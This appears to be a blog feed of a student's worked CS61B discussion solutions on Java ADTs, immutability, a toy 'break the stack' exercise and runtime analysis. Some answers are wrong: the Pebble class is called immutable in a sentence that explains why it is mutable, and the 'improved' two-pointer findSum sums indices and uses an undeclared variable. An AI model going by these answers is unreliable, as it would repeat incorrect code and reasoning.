    <content><![CDATA[<h1 id="1-Assorted-ADTs"><a href="#1-Assorted-ADTs" class="headerlink" title="1 Assorted ADTs"></a>1 Assorted ADTs</h1><p>A <strong>list</strong> is an ordered collection, or <em>sequence</em>.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List</span><br><span class="line">  add(element); <span class="comment">// add element to the end of the list</span></span><br><span class="line">  add(index, element); <span class="comment">// adds element at the given index</span></span><br><span class="line">  get(index); <span class="comment">// returns element at the given index</span></span><br><span class="line">  size(); <span class="comment">// the number of elements in the list</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>A <strong>set</strong> is a (usually unordered) collection of unique elements.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Set</span><br><span class="line">  add(element); <span class="comment">// adds element to the collection</span></span><br><span class="line">  contains(object); <span class="comment">// checks if set containes object</span></span><br><span class="line">  size(); <span class="comment">// number of elements in the set</span></span><br><span class="line">  remove(object); <span class="comment">// removes specified object from set</span></span><br></pre></td></tr></table></figure>
<p>A <strong>map</strong> is a collection of key-value mappings, like a dictionary in Python. Like a set, the keys in a map is unique.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map</span><br><span class="line">  put(key, value); <span class="comment">// adds key-value pair to the map</span></span><br><span class="line">  get(key); <span class="comment">// returns value for the corresponding key</span></span><br><span class="line">  containsKey(key); <span class="comment">//checks if the map contains the specified key</span></span><br><span class="line">  keySet(); <span class="comment">// returns set of all keys in map</span></span><br></pre></td></tr></table></figure>
<p>Stacks and queues are two similar types of linear collections with special behavior.A <strong>stack</strong> is a last-in, first-out ADT: elements are always added or removed from one end of the data structure. A <strong>queue</strong> is a first-in, first-out ADT. Both data types support three basic operations: <code>push(e)</code> which adds an element, <code>peek()</code> which returns the next element, and <code>poll()</code> which returns and removes the next element.<br>Java defines an interface that combines both stacks and queues in the Deque. A <strong>deque</strong> (double ended queue, pronounced “deck”) is a linear collection that supports element insertion and removal at both ends.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Deque</span><br><span class="line">  addFirst(e); <span class="comment">// adds e to the front of deque</span></span><br><span class="line">  removeFirst(); <span class="comment">// removes and returns front element of deque</span></span><br><span class="line">  getFirst(); <span class="comment">// returns front element of deque</span></span><br><span class="line">  addLast(e); <span class="comment">// adds e to end of deque</span></span><br><span class="line">  removeLast(); <span class="comment">// removes and returns last element of deque</span></span><br><span class="line">  getLast(); <span class="comment">// returns last element of deque</span></span><br></pre></td></tr></table></figure>
<p>Generally-speaking, a <strong>priority</strong> queue is like a regular queue except each element has a priority associated with it which determines in what order elements are removed from the queue.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PriorityQueue</span><br><span class="line">  add(e); <span class="comment">// adds element e to the priority queue</span></span><br><span class="line">  peek(); <span class="comment">// looks at the highest priority element, but does not remove it from the PQ</span></span><br><span class="line">  poll(); <span class="comment">// pops the highest priority element from the PQ</span></span><br></pre></td></tr></table></figure>

<h1 id="2-Solving-Problems-with-ADTs"><a href="#2-Solving-Problems-with-ADTs" class="headerlink" title="2 Solving Problems with ADTs"></a>2 Solving Problems with ADTs</h1><p>2.1 For each problem, which of the ADTs given in the previous section might you use to solve each problem? Which ones will make for a better or more efficient implementation?<br>(a) Given a news article, find the frequency of each word used in the article.</p>
<p><span style="color:red">Use a map. When you encounter a word for the first time, put the key into the map with a value of 1. For every subsequent time you encounter a word, get the word and put the key back into the map with the value of it plus 1</span></p>
<p>(b) Given an unsorted array of integers, return the array sorted from least to greatest.</p>
<p><span style="color:red">Use a priority queue. For each integer in the unsorted array, enqueue the integer with a priority equal to its value. Calling dequeue will return the largest number. Therefore, we can insert these values from index length-1 to 0 into our array to sort from least to greatest.</span></p>
<p>(c) Implement the forward and back buttons for a web browser.</p>
<p><span style="color:red">Use two stacks, one for each button. Each time you visit a new web page, add the previous page to the back button’s stack. When you click the back button, add the current page to the forward button stack, and pop a page from the back button stack. When you click the forward button, add the current page to the back button stack, and pop a page from the forward button stack.Finally, when you visit a new page, clear the forward button stack.</span></p>
<p>2.2 Java supports many built-in ADTs and data structures that implement these ADTs. But if we want something more complicated, we’ll have to build it ourselves.<br>If you wish to use sorting as part of your design, assume that it will take Θ(N log N) time where the length of the sequence is N.<br>(a) Suppose we want an ADT called <code>BiDividerMap</code> that allows lookup in both directions: given a value, return its corresponding key, and vice versa. It should also support <code>numLessThan</code> which returns the number of mappings whose key is less than a given key. Assume that there are no duplicate values.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BiDividerMap</span><br><span class="line">  put(k, v); <span class="comment">// put a key, value pair</span></span><br><span class="line">  getByKey(K); <span class="comment">// get the value corresponding to a key</span></span><br><span class="line">  getByValue(V); <span class="comment">// get the key corresponding to a value</span></span><br><span class="line">  numLessThan(K); <span class="comment">// return number of keys in map less than K</span></span><br></pre></td></tr></table></figure>
<p>Describe how you could implement this ADT by using existing Java ADTs as building blocks. Come up with an idea that is correct first before trying to make it more efficient.</p>
<p><span style="color:red">Create two maps, <code>Map&lt;K, V&gt;</code> and <code>Map&lt;V, K&gt;</code>. Note that when a client calls <code>put</code>, the implementation must add the mapping into each of the two component<br>maps.<br>When <code>numLessThan</code> is called, get the list of keys, sort it, and then iterate until you find a key that’s equal to or greater than the given key. Binary search could yield slightly better real-world runtime, but the order of growth will still be dominated by the time spent sorting the list.<br>To improve runtime, keep a sorted list of keys. Whenever you put a new keyvalue pair, insert the new key into the list such that the list remains sorted. When <code>numLessThan</code> is called and the key is in the <code>BiDividerMap</code>, return the index of the key in the sorted list; otherwise, use binary search to find the key that’s greater than the key and return the index of that key. Another implementation would be to use a priority queue to keep values sorted.</span></p>
<p>(b) Next, Suppose we would like to invent a new ADT called <code>MedianFinder</code> which is a collection of integers and supports finding the median of the collection.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MedianFinder</span><br><span class="line">  add(x); <span class="comment">// adds x to the collection of numbers</span></span><br><span class="line">  median(); <span class="comment">// returns the median from a collection of numbers</span></span><br></pre></td></tr></table></figure>
<p>Describe how you could implement this ADT by using existing Java ADTs as building blocks. What’s the most efficient implementation you can come up with?</p>
<span style="color:red">
Use a list. When you add, just insert to the back of the list. When computing the median, first sort the list. Then figure out the size of the list and get the middle item. For a faster solution, use an integer value for storing the current median and two priority queues, one for integers less than the median and one for integers greater than the median. When adding an integer, add it to the appropriate priority queue. Each time an integer is added, maintain balance between the priority queues by shifting integers over as needed.
</span>

<p>2.3 Define a <code>Queue</code> class that implements the <code>push</code> and <code>poll</code> methods of a queue ADT using only a <code>Stack</code> class which implements the stack ADT.<br>Hint: Consider using two stacks.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Queue</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> Stack&lt;E&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    stack.push(e);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> E <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Stack&lt;E&gt; temp = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">      temp.push(stack.pop());</span><br><span class="line">    &#125;</span><br><span class="line">    E toReturn = temp.pop();</span><br><span class="line">    <span class="keyword">while</span> (!temp.isEmpty()) &#123;</span><br><span class="line">      stack.push(temp.pop());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> toReturn;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>It can also be done by using one stack instance.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Queue</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> Stack&lt;E&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    stack.push(e);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> E <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> pop(stack.pop());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> E <span class="title">pop</span><span class="params">(E previous)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stack.isEmpty()) &#123;</span><br><span class="line">      <span class="keyword">return</span> previous;</span><br><span class="line">    &#125;</span><br><span class="line">    E current = stack.pop();</span><br><span class="line">    E toReturn = pop(current);</span><br><span class="line">    push(previous);</span><br><span class="line">    <span class="keyword">return</span> toReturn;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CS61B</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61b-disc06</title>
    <url>/2018/10/10/cs61b-disc06/</url>
    <content><![CDATA[<h1 id="1-Immutable-Rocks"><a href="#1-Immutable-Rocks" class="headerlink" title="1 Immutable Rocks"></a>1 Immutable Rocks</h1><p>Access control allows us to restrict the use of fields, methods, and classes.</p>
<ul>
<li>public: Accessible by everyone.</li>
<li>protected: Accessible by the class itself, the package, and any subclasses.</li>
<li>default (no modifier): Accessible by the class itself and the package.</li>
<li>private: Accessible only by the class itself.<a id="more"></a>

</li>
</ul>
<p>A class is immutable if nothing about its instances can change after they are constructed. Which of the following classes are immutable?</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Pebble</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> weight;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Pebble</span><span class="params">()</span> </span>&#123; weight = <span class="number">1</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><span style="color:red">This class is immutable. Pebble’s weight field is public, and thus a peddle’s state can easily be changed.</span></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Rock</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> weight;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Rock</span> <span class="params">(<span class="keyword">int</span> w)</span> </span>&#123; weight = w; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><span style="color:red">Immutable because of the weight field is final. Once initialized, can not be changed.</span></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Rocks</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Rock[] rocks;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Rocks</span> <span class="params">(Rock[] rox)</span> </span>&#123; rocks = rox; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><span style="color:red">Though rocks can not be reassigned, we can still change what the array holds and thus Rocks is mutable</span></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SecretRocks</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Rock[] rocks;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SecretRocks</span><span class="params">(Rock[] rox)</span> </span>&#123; rocks = rox; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><span style="color:red">The rocks is private, so outside variable can not reassign it or its element. However, rox can be edited externally after it is passed in, so SecretRocks is technically mutable. This class can be made immutable by using Arrays.copyOf.(<code>java.util.Arrays.copyOf()</code> method is in <code>java.util.Arrays</code> class. It copies the specified array, truncating or padding with false (if necessary) so the copy has the specified length.)</span></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PunkRock</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Rock[] band;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PunkRock</span> <span class="params">(Rock yRoad)</span> </span>&#123; band = &#123;yRoad&#125;; &#125;</span><br><span class="line">    <span class="keyword">public</span> Rock[] myBand() &#123;</span><br><span class="line">        <span class="keyword">return</span> band;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><span style="color:red">It is possible to access and modify the contents of PunkRock’s private array through its public myBand() method, so this class is mutable</span></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MommaRock</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Pebble baby = <span class="keyword">new</span> Pebble();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><span style="color:red">This class is mutable since Pebble has public variables that can be changed. For instance, given a MommaRock mr, you could mutate mr with mr.baby.weight = 5.</span></p>
<h1 id="2-Breaking-the-System"><a href="#2-Breaking-the-System" class="headerlink" title="2 Breaking the System"></a>2 Breaking the System</h1><p>2.1 Below is a flawed implementation of the stack ADT.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BadIntegerStack</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> class <span class="title">Node</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> Integer value;</span><br><span class="line">        <span class="keyword">public</span> Node prev;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(Integer v, Node p)</span> </span>&#123;</span><br><span class="line">            value = v;</span><br><span class="line">            prev = p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Node top;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> top == <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(Integer num)</span> </span>&#123;</span><br><span class="line">        top = <span class="keyword">new</span> Node(num, top));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Integer ans = top.value;</span><br><span class="line">        top = top.prev;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> top.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>(a) Exploit the flaw by filling in the main method below so that it prints “Success” by causing BadIntegerStack to produce a NullPointerException.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        BadIntegerStack stack = <span class="keyword">new</span> BadIntegerStack();</span><br><span class="line">        stack.pop();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NullPointerException e) &#123;</span><br><span class="line">        System.out.println(<span class="string">"Success!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>(b) Exploit another flaw in the stack by completing the main method below so that the stack appears infinitely tall.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    BadIntegerStack stack = <span class="keyword">new</span> BadIntegerStack();</span><br><span class="line">    stack.push(<span class="number">1</span>);</span><br><span class="line">    stack.top.prev = stack.top;</span><br><span class="line">    <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">        stack.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">"This line will never be executed!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>(c) How can we change the BadIntegerStack class so that it won’t throw NullPointerExceptions or allow ne’er-do-wells to produce endless stacks?</p>
<p><span style="color:red">Make top private.</span></p>
<h1 id="3-Design-a-Parking-Lot"><a href="#3-Design-a-Parking-Lot" class="headerlink" title="3 Design a Parking Lot!"></a>3 Design a Parking Lot!</h1><p>3.1 Design a <code>ParkingLot</code> package that allocates specific parking spaces to cars in a smart way. Decide what classes you’ll need, and design the API for each. Time permitting, select data structures to implement the API for each class. Try to deal with annoying cases (like disobedient humans).</p>
<ul>
<li>Parking spaces can be either regular, compact, or handicapped-only.</li>
<li>When a new car arrives, the system should assign a specific space based on the type of car.</li>
<li>All cars are allowed to park in regular spots. Thus, compact cars can park in both compact spaces and regular spaces.</li>
<li>When a car leaves, the system should record that the space is free.</li>
<li>Your package should be designed in a manner that allows different parking lots to have different numbers of spaces for each of the 3 types.</li>
<li>Parking spots should have a sense of closeness to the entrance. When parking a car, place it as close to the entrance as possible. Assume these distances are distinct.</li>
</ul>
<p><code>public class Car</code></p>
<ul>
<li><code>public Car(boolean isCompact, boolean isHandicapped)</code>: creates a car with given size and permissions.</li>
<li><code>public boolean isCompact()</code>: returns whether or not a car can fit in a compact space.</li>
<li><code>public boolean isHandicapped()</code>: returns whether or not a car may park in a handicapped space.</li>
<li><code>public boolean findSpotAndPark(ParkingLot lot)</code>: attempts to park this car in a spot, returning true if successful.</li>
<li><code>public void leaveSpot()</code>: vacates this car’s spot.</li>
</ul>
<p><code>private class Spot</code></p>
<ul>
<li>The Spot class can be declared private and encapsulated by the ParkingLot class. Though it is private, and therefore not a part of our parking lot API, its methods are described here to give you an idea of how a Spot class might be implemented.</li>
<li><code>private Spot(String type, int proximity)</code>: creates a spot of a given type and proximity.</li>
<li><code>private boolean isHandicapped()</code>: returns true if this spot is reserved for handicapped drivers.</li>
<li><code>private boolean isCompact()</code>: returns true if this parking space can only accomodate compact cars.<br>public class ParkingLot</li>
<li><code>public ParkingLot(int[] handicappedDistances, int[] compactDistances, int[] regularDistances)</code>: creates a parking lot containing handicappedDistances.length handicapped spaces, each with a distance corresponding to an element of handicappedDistances. Also initializes the appropriate compact and regular spaces.</li>
<li><code>public boolean findSpotAndPark(Car toPark)</code>: attempts to find a spot and park the given car. Returns false if no spots are available.</li>
<li><code>public void removeCarFromSpot(Car toRemove)</code>: records when a spot has been vacated, and makes the spot available for parking again. Prioritization of closeness in parking space selection can be handled using several priority queues (one for each kind of parking space). Occupied spaces (which are dequeued when they are assigned) can be tracked with a Map&lt;Car, Spot&gt;</li>
</ul>
]]></content>
      <categories>
        <category>CS61B</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61b-disc07</title>
    <url>/2018/10/30/cs61b-disc07/</url>
    <content><![CDATA[<h1 id="Asymptotic-Notation"><a href="#Asymptotic-Notation" class="headerlink" title="Asymptotic Notation"></a>Asymptotic Notation</h1><p>1.1 Order the following big-O runtimes from smallest to largest</p>
<p>$O(log n), O(1), O(n^n), O(n^3), O(nlogn), O(n), O(n!), O(2^n), O(n^2logn)$</p>
<p>$O(1) &lt; O(logn) &lt; &lt;O(n)&lt;O(nlogn) &lt;O(n^2logn)&lt;O(n^3)&lt;O(2^n)&lt;O(n!)&lt;O(n^n)$</p>
<p>1.2 Are the statements in the right column true or false? If false, correct the asymptotic notation (Ω(·), Θ(·), O(·)). Be sure to give the tightest bound. Ω(·) is the opposite of O(·), i.e. f(n) ∈ Ω(g(n)) ⇐⇒ g(n) ∈ O(f(n)).</p>


<a id="more"></a>
<h1 id="Analyzing-Runtime"><a href="#Analyzing-Runtime" class="headerlink" title="Analyzing Runtime"></a>Analyzing Runtime</h1><p>2.1 Give the worst case and best case runtime in terms of M and N.Assume ping is in Θ(1) and returns an int.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = N; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">    <span class="keyword">for</span> (; j &lt;= M; j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ping(i, j) &gt; <span class="number">64</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><span style="color:red">Worst case is Θ(M+N), best case is Θ(N). Pay attention to that j is outside for loop</span></p>
<p>2.2 Give the worst case and best case runtime where <code>N = array.length</code>. Assume <code>mrpoolsort(array)</code> is in Θ(N log N).</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">mystery</span><span class="params">(<span class="keyword">int</span>[] array)</span> </span>&#123;</span><br><span class="line">    array = mrpoolsort(array);</span><br><span class="line">    <span class="keyword">int</span> N = array.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i += <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">boolean</span> x = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; N; j += <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i != j &amp;&amp; array[i] == array[j])</span><br><span class="line">            x = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!x) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><span style="color:red">Worst case: $\Theta(n^2)$, best case: $\Theta(nlogn)$, don’t forget the nlogn sorting at the beginning.</span><br>Achilles Added Additional Amazing Asymptotic And Algorithmic Analysis Achievements<br>(a) What is mystery() doing?<br><span style="color:red"><code>mystery</code> returns true if every int has a duplicate in the array, (ex. {1,2,1,2}). <code>mystery</code> returns false if any unique int in the array</span><br>(b) Using an ADT, describe how to implement <code>mystery()</code> with a better runtime. Then, if we make the assumption an int can appear in the array at most twice, develop a solution using only constant memory</p>
<p><span style="color:red">A Θ(N) algorithm is to use a map and do key = element and value = number<br>of appearances, then make sure all values are &gt; 1. Uses O(N) memory however. Can do constant space by sorting then going through, but sorting is generally in O(n log n) time.</span></p>
<p>2.3 Give the worst case and best case running time in Θ(·) notation in terms of M and<br>N. Assume that comeOn() is in Θ(1) and returns a boolean.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i += <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= M; ) &#123;</span><br><span class="line">        <span class="keyword">if</span> (comeOn()) &#123;</span><br><span class="line">            j += <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            j *= <span class="number">2</span>;     </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><span style="color:red">The worst case is $\Theta(N \cdot M)$, the best case is $\Theta(N\cdot logM)$</span></p>
<h1 id="Have-You-Ever-Went-Fast"><a href="#Have-You-Ever-Went-Fast" class="headerlink" title="Have You Ever Went Fast?"></a>Have You Ever Went Fast?</h1><p>3.1 Given an int <code>x</code> and a sorted array <code>A</code> of <code>N</code> distinct integers, design an algorithm to<br>find if there exists indices i and j such that A[i] + A[j] == x.<br>Let’s start with the naive solution.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">findSum</span><span class="params">(<span class="keyword">int</span>[] A, <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.length; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; A.length; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[i] + A[j] == x) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>(a) How can we improve this solution? Hint: Does order matter here?</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">findSum</span><span class="params">(<span class="keyword">int</span>[] A, <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> small = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> big = A.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (small &lt;= big) &#123;</span><br><span class="line">        sum = small + big;</span><br><span class="line">        <span class="keyword">if</span> (sum == x) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &lt; x) &#123;</span><br><span class="line">            small++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            big--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>(b) What is the runtime of both the original and improved algorithm?<br><span style="color:red">The worst case of original is $\Theta(n^2)$, the best case is $\Theta(1)$. The worst case of improved algorithm is $\Theta(n)$, the best case is $\Theta(1)$</span></p>
<h1 id="CTCI-Extra"><a href="#CTCI-Extra" class="headerlink" title="CTCI Extra"></a>CTCI Extra</h1><p>4.1 <strong>Union</strong> Write the code that returns an array that is the union between two given arrays. The union of two arrays is a list that includes everything that is in both arrays, with no duplicates. Assume the given arrays do not contain duplicates. For example, the union of {1, 2, 3, 4} and {3, 4, 5, 6} is {1, 2, 3, 4, 5, 6}.<br><strong>Hint: The method should run in O(M + N) time where M and N is the size of<br>each array.</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] union(<span class="keyword">int</span>[] A, <span class="keyword">int</span>[] B) &#123;</span><br><span class="line">    HashSet&lt;Integer&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : A) &#123;</span><br><span class="line">        set.add(num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : B) &#123;</span><br><span class="line">        set.add(num);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span>[] unionArr = <span class="keyword">new</span> <span class="keyword">int</span>[set.size()];</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : set) &#123;</span><br><span class="line">        unionArr[index] = num;</span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> unionArr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>4.2 <strong>Intersect</strong> Now do the same as above, but find the intersection between both arrays. The intersection of two arrays is the list of all elements that are in both arrays. Again assume that neither array has duplicates. For example, the intersection of {1, 2, 3, 4} and {3, 4, 5, 6} is {3, 4}.<br>Hint: Think about using ADTs other than arrays to make the code more efficient.</p>
